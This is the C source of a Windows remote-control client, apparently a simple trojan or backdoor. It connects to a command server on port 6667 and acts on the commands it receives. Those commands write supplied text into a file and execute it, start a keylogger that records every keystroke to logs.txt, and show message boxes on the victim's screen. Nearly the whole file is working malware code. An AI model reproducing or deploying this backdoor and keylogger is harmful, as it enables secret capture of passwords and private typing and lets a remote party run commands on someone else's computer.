#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>

int KeyIsListed(int iKey, FILE* file);

int main()

{
        WSADATA WSAData;
        WSAStartup(MAKEWORD(2,0),&WSAData);
        FILE* keylogger;
        int kl = 1;
        int sock, bytes_recieved;
        char send_data[1024],recv_data[1024],filename[1024];
        struct hostent *host;
        struct sockaddr_in server_addr;

        host = gethostbyname("127.0.0.1");

        if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
            perror("Socket");
            exit(1);
        }

        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(6667);
        server_addr.sin_addr = *((struct in_addr *)host->h_addr);
        ZeroMemory(&(server_addr.sin_zero),8);

        if (connect(sock, (struct sockaddr *)&server_addr,
                    sizeof(struct sockaddr)) == -1)
        {
            perror("Connect");
            exit(2);
        }

        while(42)
        {

          bytes_recieved=recv(sock,recv_data,1024,0);
          recv_data[bytes_recieved] = '\0';

          if (strcmp(recv_data , "q") == 0)
          {
                close(sock);
                break;
          }
          else if (strcmp(recv_data , "help") == 0)
          {
                send(sock,"",0,0);
          }
          else if (strcmp(recv_data, "txt") == 0)
          {
              send(sock,"Return a file name",18,0);

              bytes_recieved=recv(sock,filename,1024,0);
              filename[bytes_recieved] = '\0';
              strcat(filename,".txt");

              FILE *file = fopen(filename,"a+");

              send(sock,"Return a content",18,0);

              bytes_recieved=recv(sock,recv_data,1024,0);
              recv_data[bytes_recieved] = '\0';

              fprintf(file,recv_data);
              fclose(file);
              send(sock,"DONE",5,0);
              system(filename);

          }
          else if (strcmp(recv_data, "klon") == 0)
          {
              keylogger = fopen("logs.txt","a+");
              //send(sock,"DONE",5,0);
              while(1)
              {
                    char key;

                    for (key = 8; key <= 190; key++) {
                        if (GetAsyncKeyState(key) == -32767) {
                            if (KeyIsListed(key,keylogger) == 0) {
                                fprintf(keylogger,"%c",key);
                                printf("%c",key);
                            }
                        }
                    }

              }
              fclose(keylogger);
              send(sock,"DONE",5,0);
          }
          else if (strcmp(recv_data,"msgbox") == 0)
          {
              send(sock,"Return a TITLE",15,0);
              char title[1024], msg[1024];
              bytes_recieved=recv(sock,title,1024,0);
              title[bytes_recieved] = '\0';

              send(sock,"Return a CONTENT",16,0);
              bytes_recieved=recv(sock,msg,1024,0);
              msg[bytes_recieved] = '\0';

              MessageBox(NULL,msg,title,MB_ICONWARNING);

              send(sock,"DONE",5,0);


          }


          else
          {
              printf("\n[*] %s " , recv_data);
              send(sock,"ERROR: No Recognition",22,0);
          }

           /*printf("\nSEND (q or Q to quit) : ");
           gets(send_data);

          if (strcmp(send_data , "q") != 0 && strcmp(send_data , "Q") != 0)
           send(sock,send_data,strlen(send_data), 0);

          else
          {
           send(sock,send_data,strlen(send_data), 0);
           close(sock);
           break;
          }
          */

        }
WSACleanup();
return 0;
}



int KeyIsListed(int iKey, FILE *file) {
    switch (iKey)
    {
case VK_SPACE:
    printf(" ");
    fprintf(file, " ");
    return 1;
    break;

case VK_RETURN:
    printf("\n");
    fprintf(file,"\n");
    return 1;
    break;

case VK_SHIFT:
    printf("[SHIFT]");
    fprintf(file,"[SHIFT]");
    return 1;
    break;

case VK_BACK:
    printf("[BACKSPACE]");
    fprintf(file,"[BACKSPACE]");
    return 1;
    break;

case VK_RBUTTON:
    printf("[RCLICK]");
    fprintf(file,"[RCLICK]");
    return 1;
    break;

case VK_LBUTTON:
    printf("[LCLICK]");
    fprintf(file,"[LCLICK]");
    return 1;
    break;

    default: return 0;
 }
 return 0;
}
